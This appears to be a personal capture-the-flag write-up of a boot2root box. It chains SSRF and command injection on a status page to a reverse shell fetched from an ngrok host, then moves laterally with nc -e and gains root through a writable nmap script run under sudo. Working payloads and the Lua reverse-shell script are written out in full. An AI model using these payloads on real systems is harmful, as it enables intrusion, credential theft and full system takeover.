
2024-11-05 20:23

Source: #Boot2root #privesc 

Nmap scan the IP
Directory Bursting on Website
### SSRF on /status/index.php

in the captured burp suite request we have an IP field 
on changing the ip field we get `etc/passwd` in return 
```
ip=file:///etc/passwd
```
### RCE via SSRF

change the IP field to the following
use the code below to see the source code a website which has a File inclusion vulnerability.
```
ip=file:///proc/self/cwd/index.php
```

this will get the index.php, now decode this from html encoding
There is some sanitization to avoid RCE, but by using `&&` , we can still execute commands and bypass the sanitization. payload (I had urlencoded the &): 
```
ip=file:///etc/passwd&&id&&
```

### Gaining foothold

I used ngrok to gain a foothold on the punisher user, and for the rest of the lateral movement, I used the CTF server itself. 
I used ngrok to expose my local port to the internet so that I could upload a shell code file onto the server

```sh
cat shell.sh
bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16004 0>&1'
```

Uploaded this file on server using wget at /tmp/shell.sh
```sh
# File uploaded on the server 
ip=file:///etc/passwd&&wget http://0.tcp.in.ngrok.io:16004/
shell.sh -O /tmp/shell.sh&&

# Executed the /tmp/shell.sh file 
ip=file:///etc/passwd&&bash /tmp/shell.sh&&
```
start a listener on port 80 and get the shell before executing shell.sh

after getting the shell we see in `/opt/ftp_cred.txt`
there are credentials for user `punisher` , login using `su punisher`

### Lateral Movement to pettigrul user

I wrote into `/tmp/xyz.sh` below command 
```sh
nc localhost 6699 -e /bin/bash
```

And started a listener as punisher user on other tab 
```sh
nc -nvlp 6699
```

To execute it I ran below command
```sh
sudo -u pettigrul /tmp/xyz.sh
``` 
And got the shell as pettigrul user
### Privesc to root

`sudo -l ` shows 
```
(ALL) NOPASSWD: /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title
``` 

The nmap way was easy for me because I had already written a Lua command execution script before. I just had to modify it a bit
Below Lua script will run command `nc 127.0.0.1 6699 -e /bin/bash`

```lua
local nmap = require "nmap"
local stdnse = require "stdnse" 
local shortport = require "shortport"

-- Port rule to target HTTP (port 80) 
portrule = shortport.port_or_service(80, "http") 

action = function(host, port) 
	local attacker_ip = "127.0.0.1" -- Set to your IP 
	local attacker_port = 6699 -- Set to the port you're listening on

	-- Execute the reverse shell using nc -e /bin/bash 
	local handle = io.popen("nc " .. attacker_ip .. " " .. attacker_port .. " -e /bin/bash")
	
	-- Close the handle after execution 
	handle:close()
	
	 return "Reverse shell executed using nc -e /bin/bash"
end
```

Since `http-title.nse` was writable, I just copied and pasted the above script after starting the listener

executed below command and got a revshell
```
sudo /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title
```

Got the foothold as root user  -  `nc -nvlp 6699
`
### References
 ISH CTF - Shivam